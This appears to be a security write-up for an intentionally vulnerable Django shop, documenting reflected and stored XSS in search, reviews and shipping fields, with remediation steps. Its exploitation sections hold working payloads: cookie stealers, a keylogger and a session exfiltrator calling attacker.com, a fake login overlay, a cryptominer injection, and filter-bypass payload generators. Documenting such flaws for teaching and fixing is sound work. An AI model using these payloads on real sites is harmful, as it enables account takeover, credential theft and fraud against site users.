# Cross-Site Scripting (XSS) Vulnerabilities Documentation

## Vulnerability Overview
**Type**: Cross-Site Scripting (XSS) - Both Reflected and Stored  
**Severity**: High  
**OWASP Category**: A03:2021 – Injection  

## Vulnerability Locations

### 1. Reflected XSS
**Location**: `/catalog/?q=` search results display  
**File**: `eshop/templates/eshop/catalog.html` (line 26)  
**Vulnerable Code**: `{{ search_query|safe }}`  

### 2. Stored XSS - Product Reviews
**Location**: Product review system  
**Files**: 
- `eshop/models/reviews.py` - No sanitization on save
- `eshop/forms.py` - Disabled bleach sanitization (lines 378-388)
- `eshop/templates/eshop/product_detail.html` - `{% autoescape off %}`
- `eshop/views.py` - No sanitization in submit_review (lines 951-957)

### 3. Stored XSS - Shipping Address
**Location**: Shipping address form fields  
**File**: `eshop/forms.py` - ShippingAddressForm clean() method disabled

## Technical Details

### Reflected XSS
The search query parameter is directly rendered in the template using the `|safe` filter, which disables Django's automatic HTML escaping.

### Stored XSS
1. **Product Reviews**: User input is stored in the database without sanitization and rendered without escaping
2. **Shipping Address**: Form fields are not sanitized before storage

## Exploitation Steps

### 1. Reflected XSS Attack
**Basic Alert Payload**:
```
http://localhost:8000/catalog/?q=<script>alert('XSS')</script>
```

**Cookie Stealer Payload**:
```
http://localhost:8000/catalog/?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

**Keylogger Payload**:
```
http://localhost:8000/catalog/?q=<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>
```

### 2. Stored XSS Attack - Product Reviews

**Basic Payload**:
```javascript
Title: Great Product!
Content: <script>alert('Stored XSS')</script>
```

**Advanced Payload - Account Takeover**:
```javascript
Title: Amazing!
Content: <script>
fetch('/api/user/session', {credentials: 'include'})
.then(r => r.json())
.then(d => fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({session: d, cookies: document.cookie})
}))
</script>
```

**DOM Manipulation**:
```javascript
Title: Best Ever
Content: <script>
document.querySelectorAll('.price').forEach(e => e.textContent = '€0.01');
document.querySelectorAll('.add-to-cart').forEach(e => e.click());
</script>
```

### 3. Stored XSS - Shipping Address

**Payload in Address Field**:
```html
123 Main St<script>alert('Address XSS')</script>
```

## Proof of Concept Scripts

### Automated XSS Testing
```python
import requests

# Test reflected XSS
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>"
]

for payload in payloads:
    response = requests.get(f"http://localhost:8000/catalog/?q={payload}")
    if payload in response.text:
        print(f"Reflected XSS confirmed with: {payload}")

# Test stored XSS in reviews
session = requests.Session()
# Login first
session.post('http://localhost:8000/login/', data={
    'username': 'testuser',
    'password': 'testpass123'
})

# Submit malicious review
review_data = {
    'title': 'Great Product <script>alert("Title XSS")</script>',
    'content': '<img src=x onerror="alert(\'Stored XSS\')">',
    'rating': 5
}

response = session.post('http://localhost:8000/product/1/review/', data=review_data)
print(f"Review submitted: {response.status_code}")
```

### XSS Payload Generator
```python
def generate_xss_payloads():
    """Generate various XSS payloads for testing"""
    
    payloads = []
    
    # Basic scripts
    payloads.append("<script>alert('XSS')</script>")
    payloads.append("<script>alert(String.fromCharCode(88,83,83))</script>")
    
    # Event handlers
    events = ['onerror', 'onload', 'onclick', 'onmouseover']
    for event in events:
        payloads.append(f'<img src=x {event}=alert("XSS")>')
        payloads.append(f'<svg {event}=alert("XSS")>')
    
    # Encoded payloads
    payloads.append("<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>")
    
    # Filter bypass attempts
    payloads.append("<scr<script>ipt>alert('XSS')</scr</script>ipt>")
    payloads.append("<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>")
    
    return payloads
```

## Impact Analysis

### Confidentiality Impact
- Session token theft
- Cookie stealing
- Keylogging capabilities
- Personal data extraction

### Integrity Impact
- Page defacement
- Form manipulation
- Fake content injection
- Phishing attacks

### Availability Impact
- Redirect loops
- Resource exhaustion
- Browser crashes

## Attack Scenarios

### 1. Session Hijacking
Attacker steals session cookies and impersonates users:
```javascript
<script>
new Image().src = "http://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
</script>
```

### 2. Phishing Attack
Inject fake login form:
```javascript
<div id="fake-login" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
  <form action="http://attacker.com/phish" method="post">
    <h2>Session Expired - Please Login</h2>
    <input name="username" placeholder="Username">
    <input name="password" type="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
</div>
```

### 3. Cryptominer Injection
```javascript
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.Anonymous('SITE_KEY');
miner.start();
</script>
```

## Remediation

### Immediate Fixes

1. **Enable Auto-escaping**:
```django
{# Remove |safe filter #}
{{ search_query }}

{# Remove autoescape off #}
{% autoescape on %}
  {{ review.content }}
{% endautoescape %}
```

2. **Re-enable Bleach Sanitization**:
```python
import bleach

def clean(self):
    cleaned_data = super().clean()
    for field in self.fields:
        if field in cleaned_data and isinstance(cleaned_data[field], str):
            cleaned_data[field] = bleach.clean(cleaned_data[field])
    return cleaned_data
```

3. **Content Security Policy**:
```python
# In middleware.py
response['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

### Additional Security Measures
1. Input validation and whitelisting
2. Output encoding based on context
3. HTTPOnly cookies
4. X-XSS-Protection header
5. Regular security audits

## Testing Commands

### Manual Testing
```bash
# Reflected XSS
curl "http://localhost:8000/catalog/?q=<script>alert('XSS')</script>"

# Check if payload is reflected
curl "http://localhost:8000/catalog/?q=test" | grep -o "test"
```

### Automated Testing with XSStrike
```bash
python xsstrike.py -u "http://localhost:8000/catalog/?q=query" --crawl
```

## References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)